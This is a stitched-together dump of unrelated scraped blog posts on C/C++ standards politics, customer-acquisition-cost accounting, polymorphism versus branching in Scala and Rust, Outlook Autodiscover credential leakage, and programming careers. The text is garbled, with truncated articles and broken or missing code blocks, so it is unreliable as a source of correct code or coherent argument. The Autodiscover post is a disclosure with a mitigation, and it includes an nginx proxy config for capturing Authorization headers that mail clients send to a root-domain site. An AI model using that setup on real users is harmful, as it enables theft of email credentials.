Logically, people who like C++'s philosophy will get involved in the C++ community and the C++ standardization process
while other people might try to get involved with C.
Committees, whether its C’s or C++'s, only manifest intent and direction through their respective end-product: the standards; standards which are the fruits of numerous voting.</p>
<p>At the same time, it is difficult for a compiler to know that it is dealing with a C header or a C++ header.</p>
<p><code>extern "C"</code> is not used consistently and only affects mangling, but neither grammar nor semantics.
And headers only exists in the eyes of the preprocessor, for a C++ compiler, everything is a C++ translation unit, and therefore C++.
And yet, people include C headers in C++ and expect it to “just work” ™️.
Which it mostly does.</p>
<p>We can wonder then,</p>
<h2 id="how-c-maintains-c-compatibility-while-being-developed-by-different-people-in-different-places">How C++ maintains C compatibility while being developed by different people in different places?</h2>
<p>Badly, I’m afraid.</p>
<p>A coworker recently reminded me of Conway’s law:</p>
<blockquote>
<p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure</p>
</blockquote>
<p>By that logic, it would stand to reason that if the two committees don’t interoperate,
neither would the languages they produce.</p>
<p>C++ maintains a list of <a href="http://eel.is/c++draft/diff.iso">incompatibilities with C</a> and <a href="http://eel.is/c++draft/diff.library">its standard library</a>.
This list does not seem to reflect the many features that were added to C11 and C18 but are not valid C++ constructs. <a href="https://en.wikipedia.org/wiki/Compatibility_of_C_and_C%2B%2B">Wikipedia</a> draws a clearer picture.</p>
<p>Listing incompatibilities isn’t sufficient to get a measure of incompatibilities between both languages.</p>
<p>Functions that exist in the C++ standard library but whose primary declaration is expected to come from C are difficult to make <code>constexpr</code>, and more difficult still to make <code>noexcept</code>.
C compatibility translates to performance costs and C functions are optimization barriers.</p>
<p>Many C constructs are valid C++ but should never pass a code review (<code>NULL</code>, <code>longjmp</code>, <code>malloc</code>, create/destroy functions, <code>free</code>, C  casts), etc.</p>
<p>These might not be bad C idioms, but they are bad C++. C++ has a stronger type system,
and unfortunately using C idioms punch a giant hole in that type system, and so C compatibility has a cost in terms of safety.</p>
<p>Don’t get me wrong, C++ still care about C compatibility. Somewhat.
And interestingly C cares about C++. Somewhat.
Truth be told, C might care about C++ more than C++ cares about C.
So each committee cares somewhat about what the other does.
We care reluctantly.</p>
<p>See, C++ is aware of the many foundational libraries written in C, not only the <code>libc</code> but also <code>zip</code>, <code>png</code>, <code>curl</code>, <code>openssl</code> (!), and countless others, which are used in many, many C++ projects.
We can’t break that.</p>
<p>But recently, especially over the past decade, C++ has become much bigger than C.
C++ has more users - and a much more active community: <a href="https://nullprogram.com/blog/2018/11/21/">There Are No C Conferences</a>.
Maybe that’s why the C++ committee is now over 10 times the size of the C committee.</p>
<p>C++ then is a force to be reckoned with and the C committee has to consider not breaking C++.
To the point that if a standard would track another, these days, C++ leads and C follow.</p>
<p>C++ is now on a steady three years cycle come rain or shine, or deadly pandemics.
Meanwhile, C has a major release every decade or so.
This makes sense. As a lower-level language, C doesn’t need to evolve as fast.</p>
<p>The C landscape is also rather different from the C++ landscape.
C caters to more platforms and a lot more compilers.
Everybody and their dog is writing C compilers because the language has a surface area small enough to make that possible, whereas the C++ committee will only really consider 4 implementations, all of which are represented at every meeting.
As a result, many features in C are implementation-defined or optionally supported so that the variety of compilers that exist can claim conformance without doing much work, which I’m told pleases regulatory bodies.</p>
<p>C++ these days is more interested in portability than implementation freedom. Yet another difference of philosophy.</p>
<h2 id="so-your-proposal-breaks-c-compatibility">So, your proposal breaks C compatibility</h2>
<p>Parts of my <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2178r1.pdf">P2178</a> paper theoretically affects C compatibility.
In such cases, none of the options seems satisfactory.</p>
<p>You could be told that you have to first get your feature into C. Which means more meetings.
Meetings you might not be able to attend because C has strict <a href="https://thephd.github.io/follow-the-river-wg14-ithaca-2019">attendance rules</a> - Excluding individuals not willing to put down thousands of dollars to become ISO members.
This is because the C committee is forced to adhere strictly to ISO rules.</p>
<p>It might also take a decade if the standard just shipped.
And most importantly, it might go nowhere if the C committee doesn’t understand or doesn’t care about the particular problem you are trying to solve.
And they probably don’t have the bandwidth to deal with it.
And you may not have the bandwidth to deal with C. After all, you joined C++ to improve C++.
In fact, if the room invites you to “talk to the C committee”, it is likely your proposal is dead, even in the unlikely event that no one in the room was against it.</p>
<p>Another likely scenario is that the C committee accepts a version of a proposal that is slightly different from what exists in C++.
<code>true</code>? Let’s make that a macro. <code>char16_t</code> ? Let’s make that a typedef. <code>char32_t</code>? Not necessarily UTF-32. <code>static_assert</code> ? <code>_Static_assert</code>.</p>
<p>The list goes on. Should we blame C? Probably not. Their committee does what they think is best for their language.
The opposite is true too. In C++20 designated initializers were inspired by C’s but are slightly different because they would otherwise not fit with the C++ initialization rules.</p>
<p>I am part of the problem. C has VLAs. I would vote against a proposal to adopt that in standard C++, <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Linux-Kills-The-VLA">too many security issues</a>. A proposal to add <code>_Generic</code> to C++ would be over-my-dead-body. I am not sure if <code>_Generic</code> attempts to palliate to the lack of template or the lack of overloads, but C++ has both these features - from my point of view <code>_Generic</code> doesn’t fit into the big picture of what I imagine C++ to be.</p>
<p>Both committees seem also inconsistent in how much they care about the other language.
Sometimes we go to great lenghts (<a href="https://en.cppreference.com/w/cpp/numeric/complex">std::complex</a>), sometimes we don’t care at all (<a href="https://en.cppreference.com/w/c/language/array">static array parameters</a>).</p>
<p>There is no way around this. Don’t forget that each committee is a bunch of people
voting at different times in different rooms and trying to control the outcome would defeat the purpose
of having a vote.
Putting people in the same room is not realistic either. ISO might object and the participation inbalance
would put C people at an enormous disadvantage.</p>
<h2 id="c-compatibility-doesnt-matter-kinda">C compatibility doesn’t matter, kinda</h2>
<p>If you are a C developer, I imagine you see C as a neat programming language.
But for the rest of us, C is something else.</p>
<p>C is the universal, cross-language glue that ties it all together.</p>
<p>For C++ users, C is …</p></div></div>

September 2, 2020 | https://www.causal.app/blog/cac-is-not-sales-marketing-expense | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/cac-is-not-sales-marketing-expense">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a></p><p>Generally accepted accounting principles were designed to create a single standard for comparing any and all businesses using the same terms and metrics. This is a very powerful tool, but it is a clear exchange for breadth over specificity. As a result, the economic reality of a business will likely differ from what the accounting metrics represent. By looking at a subset of business models, we can improve specificity - terms like <em>ARR </em>and <em>GMV</em> are both examples of this. While these terms have their own challenges with definitions, I think most agree what they represent: ARR is annualized recurring revenue for SaaS companies, and GMV is gross merchandise/marketplace value for marketplace companies.</p><p>One of my favorite examples of this is CAC - customer acquisition cost. It’s relevant for both SaaS businesses and marketplaces. Average CAC is the cost to acquire a single customer and Total CAC is the full spend for a cohort of customers. So what is the difference between <strong>CAC</strong> and <strong>Sales &amp; Marketing</strong> expense? The truth is that Total CAC and S&amp;M over a given period of time <em>might </em>be the same. That being said, the usually differ by a <em>time offset </em>that depends on <strong><em>sales cycle length</em></strong>.</p><p>The critical distinction is <strong>sales cycle length</strong>. <em>Sales cycle is how long it takes for a customer to go from first contact to closing a deal</em>. We measure sales cycle by segment and can use simple reports in Salesforce or another CRM tool to figure out how long it takes on average for customers to move through the sales funnel. Generally sales opportunities begin as leads, some of those convert to <em>qualified for sales</em> and then some of those convert to <em>closed-won</em>. The Sales Funnel shows the volume and conversion at each step in the process and is usually in the hands of the CRO or sales operations team. The two lengths of time that we care about in finance are: top of funnel to sales qualification (i.e. marketing cycle length) and then sales qualification to closed-won (i.e. sales cycle length).</p><p>There is a large variance in sales cycle lengths from business to business. For example, consumer software might have a &lt;1 month sales cycle that runs entirely on marketing. On the other end of the spectrum, a complex sale to a large institution may take over a year and involve a number of different people and teams.</p><p>For the in-month sales cycle, New ARR in Month X will be attributed to the Marketing expense in Month X. Pretty straightforward.</p><p>As soon as you have a separate marketing funnel and sales funnel and things take longer than a few weeks, it becomes more complicated to measure, track and predict.</p><p>I often see operating stats that look like this:</p><figure id="w-node-be6f6b2d374d-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f4e9f755f630ab3e0e98ebd_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F79d18d99-150c-4eae-b10a-cc00916f9da3_1168x196.png" alt=""></p></figure><p>‍</p><p>The high level sales efficiency metric is New ARR / S&amp;M: the idea being that we are investing in S&amp;M in order to generate new ARR. The missing piece of information here is <strong>how long are the customers in the marketing funnel and how long are they in the sales funnel</strong>. Without that info, people often assume that it is in the same time period - whether that is a month, a quarter or a year. Switching over to a CAC calculation based on sales cycle length gives a more accurate picture of the sales efficiency.<br></p><p>For example: let’s say the marketing funnel takes <strong>1 month</strong> and the sales funnel takes <strong>3 months</strong>.<br></p><p>As a result, CAC would be the Marketing expense from 3 months prior and the average of the Sales expense over the last 3 months. So in the above example, new ARR acquired in April would be associated with the Marketing spend in January and the average of the Sales spend in Feb, March and April. Because this is a growing business, CAC will be lower than the S&amp;M in the same month, meaning that efficiency numbers are actually higher when based on CAC. Quick note to operating executives: don’t use a basic formula and sell yourself short.<br></p><p>Now looking at it through the lens of sales cycle-dependent CAC:<br></p><figure id="w-node-5b3f68252472-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f4e9f8ca3a860067d1d36b8_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fce0d6249-9d70-4cff-87bb-36004dfe03c8_1168x278.png" alt=""></p></figure><p>‍</p><p>Once you have the CAC line in the model, you can use it for SaaS Magic number, CAC payback, and a number of other metrics. (Of course, as the sales cycle changes, the CAC calculation must also change.) These metrics are important because they usually stay constant for a given product and business operation and allow you to project into the future.</p><p>The CAC calculation gets you one level deeper towards operating metrics from the high level financial metrics and is often a good bridge between the two. It represents the detailed funnels at a high level, and will ultimately drive projections with a higher degree of accuracy. For example, we now know that leads acquired through marketing spend in December will not yield sales until 3 months later in March. Based on historical metrics, we know roughly how many leads this spend will get us and therefore what kind of sales capacity we need to close on those leads and can plan sales hiring accordingly.<br></p><p>Coming from the financial perspective down into the operating perspective is a bit of a rabbit hole, so there’s an art in knowing where to stop, and it’s usually the point where precision starts to overtake accuracy in the model and digging deeper stops yielding better results. One step down from this, for example, would be to look into the sales expense - sales people are generally paid 50%+ of their total salary in commissions. If those commissions are paid in the month of sale, half of the sales expense should be weighted from that month and the other half weighted across the earlier months. If sales people are paid later on, then looking at it from a purely economic perspective as it pertains to commission rates will yield a much better result than looking at the accounting outputs for sales expense.<br></p></div></div>]]>

  <p>Recently I came across a <a href="https://levelup.gitconnected.com/if-else-is-a-poor-mans-polymorphism-ab0b333b7265">blog post</a>
whose author claims, from the perspective of good coding practices, polymorphism is strictly superior to branching. 
In the post they make general statements about how branching statements lead to unreadable, unmaintainable, inflexible code and
how they are a sign of immaturity. However, in my opinion, the topic is much deeper and in this post 
I try to objectively discuss the reasons for and against branching.</p>

<!--more-->



<p>Before I dive into polymorphism vs branching dilemma, let’s first define what we mean when we say some code is
flexible and easy to extend. In my career I reviewed thousands of lines of code, and I had thousands of lines of my code
reviewed by others, and during these reviews it often occured that the terms <em>code extensibility</em> or <em>flexibility</em> 
mean different things to different people. Familiarity with the code-base or particular programming style plays a huge role.</p>

<p>For example, someone used to writing code in a Java/C# OOP style would generally consider dynamic polymorphism through 
interfaces a standard way of providing extensibility to the code, 
while a C programmer may find a switch or if/else much more 
approachable than OOP. There are also many other factors related 
to maintainability as quality of documentation, good naming, separation of concerns, etc. These factors are orthogonal 
to the “polymorphism vs branching” dimension and also far too broad for a single blog post, so I won’t discuss them.</p>

<p>For the sake of this post, let’s define <em>extensibility</em> as the inverse of number of distinct units in the codebase
that need to be changed in order to implement a new feature. The more places you have to touch to implement the feature, 
the harder the code is to change. Obviously, it is much better when you have to touch only
one unit of code (one function, one class, one module, one package) rather than change 10 distinct unrelated units.</p>


<p>Imagine you’re writing a calculator. Your program gets an expression as an input and outputs the computed value.
For example the user inputs <code>1 + 2 * 3</code> and the output is <code>7</code> 
(or <code>9</code> if you’ve messed up the operator precedence like one of my former CS students).</p>

<p>Why such a silly example? Who is writing calculators these days? Probably no-one, but this looks like a classic example given
in many programming classes. And it is easy enough to illustrate the concept.</p>

<p>How can we model a structure to represent an expression?
You’d probably use classes or structures. Here is the code in Scala:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span>
<span>}</span>

<span>case</span> <span>class</span> <span>Const</span><span>(</span><span>value</span><span>:</span> <span>Double</span><span>)</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span> <span>=</span> <span>value</span>
<span>}</span>

<span>case</span> <span>class</span> <span>Add</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span> <span>=</span> <span>left</span><span>.</span><span>eval</span> <span>+</span> <span>right</span><span>.</span><span>eval</span>
<span>}</span>
</code></pre></div></div>

<p>Then it is quite easy to build an expression and evaluate it:</p>
<div><div><pre><code><span>Add</span><span>(</span><span>Const</span><span>(</span><span>2</span><span>),</span> <span>Const</span><span>(</span><span>3</span><span>)).</span><span>eval</span> <span>// evaluates to 5 </span>
</code></pre></div></div>


<p>This OOP-based solution is indeed very extensible when it comes to add a new operator.
The example above is missing subtraction operation. We can add one by defining a new class:</p>

<div><div><pre><code><span>case</span> <span>class</span> <span>Sub</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span> <span>=</span> <span>left</span><span>.</span><span>eval</span> <span>-</span> <span>right</span><span>.</span><span>eval</span>
<span>}</span>
</code></pre></div></div>

<p>That’s really awesome – we didn’t have to touch any old code at all! 
OOP definitely rocks here.</p>


<p>Imagine you continued to extend our calculation engine with more operation classes over the next few years.
You’ve added multiplication, division, modulo, variables, logarithms, trigonometric functions, etc.</p>

<p>Then suddenly a new requirement comes – users want to not only evaluate the value of an expression,
but also do symbolic manipulation – e.g. simplify expressions. For example, given an expression
<code>a + a</code> they want to get an expression <code>2 * a</code> as a result.</p>

<p>This requirement can’t be captured by the <code>eval</code> method on the <code>Expression</code> interface. We need a new method:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span>
    <span>def</span> <span>simplify</span><span>:</span> <span>Expression</span>
<span>}</span>
</code></pre></div></div>

<p>And as the next step, they would likely want to be able to display the expression as a String:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span>
    <span>def</span> <span>simplify</span><span>:</span> <span>Expression</span>
    <span>def</span> <span>toString</span><span>:</span> <span>String</span>
<span>}</span>
</code></pre></div></div>

<p>How many units of code do you have to change now to implement these features?
<strong>All the implementations of <code>Expression</code></strong>. Before touching all the classes, the code wouldn’t even compile.
It looks like in the context of this kind of feature, our polymorphic solution is terribly non-extensible.</p>


<p>Let’s take a step back and let’s see how we could implement this differently.
Scala and many other modern languages have a feature called <em>pattern matching</em>
which can be considered a very flexible, powerful switch.</p>

<p>Instead of defining the operations like <code>eval</code> or <code>simplify</code> on the case classes,
let’s pull them up:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
<span>case</span> <span>class</span> <span>Const</span><span>(</span><span>value</span><span>:</span> <span>Double</span><span>)</span> <span>extends</span> <span>Expression</span>
<span>case</span> <span>class</span> <span>Add</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span>


<span>def</span> <span>eval</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>Double</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Const</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>Add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>=&gt;</span> <span>a</span> <span>+</span> <span>b</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Now adding a new operation like <code>Sub</code> would require two changes to the code – adding a new class
<em>and</em> adding a new case in the match (switch) statement.</p>

<p>Some may say this much worse not only because of more places to update, but because of a possibility of
forgetting to update the switches which could lead to runtime errors due to unhandled cases.
Fortunately, Scala designers thought about this by providing the <code>sealed</code> keyword, which instructs the compiler
that all case classes can be defined in the same module only. This unlocks pattern exhaustiveness analysis and the
compiler would warn about missing cases:</p>

<div><div><pre><code><span>sealed</span> <span>trait</span> <span>Expression</span>
<span>case</span> <span>class</span> <span>Const</span><span>(</span><span>value</span><span>:</span> <span>Double</span><span>)</span> <span>extends</span> <span>Expression</span>
<span>case</span> <span>class</span> <span>Add</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span>

<span>def</span> <span>eval</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>Double</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Const</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>Add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>=&gt;</span> <span>a</span> <span>+</span> <span>b</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>What about adding new functions like <code>simplify</code> or <code>toString</code>? 
It requires to changle only <strong>one place</strong> – by adding the required methods. 
No changes to the existing code are needed!</p>

<div><div><pre><code><span>def</span> <span>simplify</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>Expression</span> <span>=</span> <span>{</span>

    <span>case</span> <span>Add</span><span>(</span><span>x</span><span>,</span> <span>Const</span><span>(</span><span>0</span><span>))</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>other</span> <span>=&gt;</span> <span>other</span>
  <span>}</span>
<span>}</span>

<span>def</span> <span>toString</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>String</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Const</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span><span>.</span><span>toString</span>
    <span>case</span> <span>Add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>=&gt;</span> <span>"("</span> <span>+</span> <span>toString</span><span>(</span><span>a</span><span>)</span> <span>+</span> <span>" + "</span> <span>+</span> <span>toString</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>"</span><span>)</span> 
  <span>}</span>
<span>}</span>
</code></pre></div></div>


<p>The blog post I mentioned in the introduction stated that using polymorphism instead of
branching leads to more readable code. I find this statement far too general and actually very debatable.</p>

<p>First, even in their own example given by the author of that blog, the solution using branching was a lot
shorter and less complex than the solution using OOP. While brief code is not always more readable than a longer version of it,
in that case, I found branching to be very explicit and easy to follow. 
It is much easier to understand the control flow
in such a program because all targets are explicitly given in a single place. In the OOP solution, 
the actual implementations are hidden behind the interface and it is much harder to find them all without additional 
help of a good IDE with a “jump to implementations” feature 
(which fortunately often works well for statically typed languages, but I’ve seen IDEs sometimes 
struggle with dynamic languages like Python).</p>

<p>Second, in general case, branching has an advantage that the function logic may depend on more than
one object type or even the actual data. For example, in the example from this post, 
the transformation <code>a * (b + c)</code> =&gt; <code>a * b + a * c</code> would depend on 
both addition and multiplication. In the classic OOP solution, would you place it in the <code>Add</code> or in the <code>Mul</code> class? 
Neither seems right. Also, putting it into one of them creates a dependency on the other one. 
An expression simplifier with code scattered accross multiple classes heavily depending on each other 
would be hard to understand.</p>


<p>This is a blog on high performance programming, so the post would be incomplete without a 
section on performance. In theory, a sufficiently good compiler should produce the same
code regardless of the choice between branching or dynamic polymorphism, but is this the case in reality?
Compilers have limitations and often don’t generate the best result code possible.</p>

<p>Let’s consider a more realistic example this time.
Some time ago I was working on serializing/deserializing code in a database system.
I stumbled upon a set of classes that described data types. They all implemented 
a common interface defining methods for serializing and deserializing values of given data type
and also computing serialized data lenghts. The following Rust snippet is a huge simplification 
of that code, but it illustrates the concept:</p>

<div><div><pre><code><span>pub</span> <span>trait</span> <span>DataType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span><span>;</span>
<span>}</span>

<span>pub</span> <span>struct</span> <span>BoolType</span><span>;</span>
<span>pub</span> <span>struct</span> <span>IntType</span><span>;</span>
<span>pub</span> <span>struct</span> <span>LongType</span><span>;</span>

<span>impl</span> <span>DataType</span> <span>for</span> <span>BoolType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span> <span>1</span> <span>}</span>
<span>}</span>

<span>impl</span> <span>DataType</span> <span>for</span> <span>IntType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span> <span>4</span> <span>}</span>
<span>}</span>

<span>impl</span> <span>DataType</span> <span>for</span> <span>LongType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span> <span>8</span> <span>}</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>data_len</span><span>(</span><span>data_type</span><span>:</span> <span>&amp;</span><span>dyn</span> <span>DataType</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
    <span>data_type</span><span>.len</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>Given a reference to a <code>DataType</code> object, it is trivial to compute the data size associated with it, 
without knowing the exact static type:</p>

<div><div><pre><code><span>let</span> <span>t1</span> <span>=</span> <span>IntType</span><span>;</span>
<span>let</span> <span>t2</span> <span>=</span> <span>LongType</span><span>;</span>
<span>let</span> <span>v</span><span>:</span> <span>Vec</span><span>&lt;&amp;</span><span>dyn</span> <span>DataType</span><span>&gt;</span> <span>=</span> <span>vec!</span><span>[</span><span>&amp;</span><span>t1</span><span>,</span> <span>&amp;</span><span>t2</span><span>];</span>
<span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>data_len</span><span>(</span><span>v</span><span>[</span><span>0</span><span>]));</span>  <span>// prints 4</span>
<span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>data_len</span><span>(</span><span>v</span><span>[</span><span>1</span><span>]));</span>  <span>// prints 8</span>
</code></pre></div></div>

<h2 id="performance-of-dynamic-dispatch">Performance of Dynamic Dispatch</h2>

<p>The implementation of the <code>data_len</code> function is actually very simple:</p>


<p>Wow! A single assembly instruction! 
It jumps to the address stored in the the vtable of the object pointed by the <code>rsi</code> register.
The target of the jump depends on the actual type of the object. Here is the code generated for <code>IntType.len</code>:</p>



<p>The codes for the other types differ only in the constant value.</p>

<p>These are only 3 instructions to return the result. Shouldn’t it be fast? 
Let’s measure this. Let’s put more random <code>DataType</code> objects …</p></article></div>

<p>It's fairly common for an organisation's website to exist outside the organisation's operational security policies. There's a common justification that for many organisations, the website is a marketing landing page and no sensitive data is ever involved. This in turn oftens leads to the prevance of, for example, shared hosting companies holding dozens of compromised Wordpress sites at a time.</p>

<p>We regularly see this when major businesses are compromised. This is unfortunate.</p>



<p>Anyone who has read the web access log on such a server has probably found themselve Googling what autodiscover.xml is. Here's an example from my own server, of something which may be rare if you have a few users. I grepped an larger organisation's log and found around 1200 hits per day.</p>
<div><pre><code data-lang="">020/09/02 05:54:40 [error] 385#385: *33613 open() "/var/www/html/autodiscover/autodiscover.xml" failed (2: No such file or directory),
    client: 1.2.3.4, server: lolware.net, request: "POST /autodiscover/autodiscover.xml HTTP/1.1", host: "lolware.net"
</code></pre></div>
<p>The reason for this is Microsoft's Autodiscover mechanism. And it's worth noting that while I'm going to talk about Outlook, many mail clients support autodiscover with varying rules and process.</p>

<p>Microsoft have a good technical brief here: <a href="https://support.microsoft.com/en-au/help/3211279/outlook-2016-implementation-of-autodiscover">https://support.microsoft.com/en-au/help/3211279/outlook-2016-implementation-of-autodiscover</a>.</p>

<p>As you can see, step six of the discovery processis "check the root domain". And that tends to be a step that's hit before the issue is settled, usually at step 7 or step 9. You can also see described the triggers and schedules for autodiscover.</p>

<p>A more practical, and digestable article for people not often working with Office 365 can be seen here: <a href="https://practical365.com/exchange-server/fixing-autodiscover-root-domain-lookup-issues-mobile-devices/">https://practical365.com/exchange-server/fixing-autodiscover-root-domain-lookup-issues-mobile-devices/</a>.</p>

<p>I quite like this article as the reference to the web hosting circus will be quite familiar to anyone who has had to support the average shared hosting environment. Those people will be familiar with how common hacked websites are.</p>



<p>The problem with the autodiscovery situation described is that I can put a redirect in my web server's nginx config:</p>
<div><pre><code data-lang="">        location /autodiscover/autodiscover.xml {
            proxy_set_header X-Forwarded-For $remote_addr;
            proxy_pass http://localhost:8089;
        }
</code></pre></div>
<p>And of course similar options exist for Apache. With this in place, here's a dump of a proxied connection:</p>
<div><pre><code data-lang="">[2020-09-02 06:09:09] ERROR `/autodiscover/autodiscover.xml' not found.

</code></pre></div>
<p>What's crucial here is that as long as the server doesn't immediately reject the connection with a 404, the connecting client sends a discovery request that <em>includes an Authorization header</em>. The below code can take advantage of this:</p>

<p>Now obviously before I wrote this blog, I setup a temporary account and connected Outlook. Running the above code on my server started pumping this sort of content to the console.</p>

<p>Microsoft's article discusses the <em>ExcludeHttpRedirect</em> registry key, but for most cases it's not a solution as it won't impact mobile users or anyone not using your exact version of Outlook on a corporate device.</p>

<p>The most approachable I've come up with is that a redirect can be put in place upstream if you use a service like Cloudflare. The following page rule takes this URL out of the hands of a web host by redirecting the connection to the correct place.</p>



<p>The practical365 site states "the root domain lookup makes absolutely no sense to me" and any attempt to read a discussion on the issue will lead you to plenty of discussion of this as nonsense. Unfortunately for as long as this priority exists, this problem will.</p>

				<p>"<a href="http://prog21.dadgum.com/154.html">Do You Really Want to be Doing This When You're 50?</a>"</p>
<p>Well, I didn't really want to be doing this when I was 20. I'm in it for the money. As long as there's money in programming, I'll stay for the money, in all likelihood.</p>
<p>What <em>else</em> do you want to be doing when you're 50? Give me a profession remotely close to programming in the following ways:</p>
<ul>
<li>Little or no required education</li>
<li>Good compensation, even for mediocre performers</li>
<li>Millions of jobs</li>
<li>No physical effort</li>
<li>No health or legal risks</li>
</ul>
<p>Programming is money for nothing. Programming is very easy to enter and extremely hard to quit. What would you do instead?</p>
<p>I work with three lawyers – two became programmers and one became a PM. I haven't met programmers who became lawyers. I do know an engineer – not a programmer – who became a patent attorney (reported reason: "at some point, you resent your manager being the age of your kids"). Would you like to become a patent attorney when you're 50?</p>
<p>I had a manager who decided he'd rather be a school teacher, thinking that this line of work is more beneficial to society. He quit after 8 months, saying in his parting interview to a mainstream newspaper: "Sometimes I just want to enter the classroom with a machine gun and open fire". He's with Samsung now; he feels that his contribution to smartphone imagers benefits society substantially enough.</p>
<p>One of my roommates at work has been studying a bunch of things for a while now. He's got a degree in psychology and in something called Visual Theater. He's been programming part-time all the while, which is how he financed his studies. He's programming as a part of his visual performances (there's computer music involved). He'll likely be programming to finance his art work. I'm not sure he plans to quit programming at any defined point.</p>
<p>I've seen a lot of people "quitting" to study anything from physics to philosophy, and then going back to programming. The money is addictive. There are many other sources of satisfaction, of course – which is why I run this blog for free – but much of this satisfaction has to do with <em>demand</em>, directly or indirectly, and is thus very much related to money. "Building something useful" and "making money" are close relatives.</p>
<p>You could, of course, become independently wealthy. But you probably won't, and then programming is your plan B. There's also a thing about material wealth – it's easily taken away. I'm from Soviet Russia, so I tend to exaggerate the likelihood of that – but really, property is easily confiscated, and paper money can become paper overnight. It's not just a USSR thing; the US <a href="http://en.wikipedia.org/wiki/Executive_Order_6102">confiscated gold</a> from its citizens at about the same time as the USSR. Professional ability, however, can't be confiscated. The prudent (paranoid?) independently wealthy programmer will thus make some effort to stay in a good shape.</p>
<p>There's the argument that professional programming is stressful. Again – compared to what? A doctor's work? A lawyer's work? Answering calls by irate customers while your responses are recorded for later inspection?</p>
<p>What stress? Programmers who can program at all – as in, print out a binary tree correctly – are very scarce. This scarcity makes it rather hard to push programmers around. You can try to bully them into doing unpaid overtime, but they quickly learn that it's a seller's market, and that you're basically bluffing. You have nobody to replace them with.</p>
<p>With demand outstripping supply, there's enough space in programming for everyone. This makes for a not-so-competitive environment, compared to, say, finance/investment banking type of jobs. Programmers are also typically shielded from customers and senior management – the kind of people who're always right, a trait making communication somewhat tiresome.</p>
<p>Deadlines? Sure, we have them, just like everybody else. Let's admit it though – we tend to miss them, and it's not very stressful to us unless we want it to be. If you're given an impossible schedule, and you do your best, and you miss the deadline, you can suffer deeply or you can maintain mental peace. The fact is that your material well-being is rarely in jeopardy because of a missed deadline, so your reaction is fully up to you.</p>
